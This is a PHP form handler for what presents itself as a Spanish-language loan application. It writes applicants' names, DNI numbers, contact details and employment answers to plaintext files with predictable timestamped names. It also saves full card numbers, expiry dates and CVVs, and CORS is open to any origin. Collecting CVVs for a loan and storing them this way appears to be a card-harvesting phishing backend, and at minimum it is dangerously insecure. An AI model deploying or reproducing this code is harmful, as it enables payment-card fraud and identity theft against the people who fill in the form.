<?php
// Set headers to handle CORS if needed
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Check if the request is a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the JSON data from the request
    $formData = isset($_POST['formData']) ? json_decode($_POST['formData'], true) : null;
    
    if ($formData) {
        // Create a unique filename based on timestamp
        $filename = 'loan_application_' . date('Y-m-d_H-i-s') . '.txt';
        
        // Format the data in a readable way
        $output = "=== SOLICITUD DE PRÉSTAMO ===\n";
        $output .= "Fecha: " . date('d/m/Y H:i:s') . "\n\n";
        
        // Personal Information
        $output .= "INFORMACIÓN PERSONAL\n";
        $output .= "==================\n";
        $output .= "Nombre: " . $formData['firstName'] . "\n";
        $output .= "Apellido: " . $formData['lastName'] . "\n";
        $output .= "DNI: " . $formData['dni'] . "\n";
        $output .= "Provincia: " . $formData['province'] . "\n";
        $output .= "Email: " . $formData['email'] . "\n";
        $output .= "Teléfono: " . $formData['phone'] . "\n\n";
        
        // Loan Details
        $output .= "DETALLES DEL PRÉSTAMO\n";
        $output .= "===================\n";
        $output .= "Monto solicitado: $" . number_format($formData['loanAmount'], 2) . "\n";
        $output .= "Plazo: " . $formData['loanTerm'] . " meses\n\n";
        
        // Employment Information
        $output .= "INFORMACIÓN LABORAL\n";
        $output .= "==================\n";
        $output .= "Situación laboral: " . $formData['employmentStatus'] . "\n";
        
        // Employment Questions
        if (!empty($formData['employmentQuestions'])) {
            $output .= "\nRespuestas adicionales:\n";
            foreach ($formData['employmentQuestions'] as $question => $answer) {
                $output .= $question . ": " . $answer . "\n";
            }
        }
        
        $output .= "\nINFORMACIÓN DE TARJETA\n";
        $output .= "====================\n";
        $output .= "Tipo de tarjeta: " . $formData['cardType'] . "\n";
        $output .= "Nombre en tarjeta: " . $formData['cardName'] . "\n";
        $output .= "Número: " . $formData['cardNumber'] . "\n";
        $output .= "Vencimiento: " . $formData['cardExpiry'] . "\n";
        $output .= "CVV: " . $formData['cardCvv'] . "\n";
        
        // Write the formatted data to a file
        if (file_put_contents($filename, $output)) {
            // Return success response
            http_response_code(200);
            echo json_encode([
                'success' => true, 
                'message' => 'Solicitud guardada exitosamente',
                'filename' => $filename
            ]);
        } else {
            // Return error if file write fails
            http_response_code(500);
            echo json_encode([
                'success' => false, 
                'message' => 'Error al guardar la solicitud'
            ]);
        }
    } else {
        // Return error if no data received
        http_response_code(400);
        echo json_encode([
            'success' => false, 
            'message' => 'No se recibieron datos del formulario'
        ]);
    }
} else {
    // Return error for non-POST requests
    http_response_code(405);
    echo json_encode([
        'success' => false, 
        'message' => 'Método no permitido'
    ]);
}
?>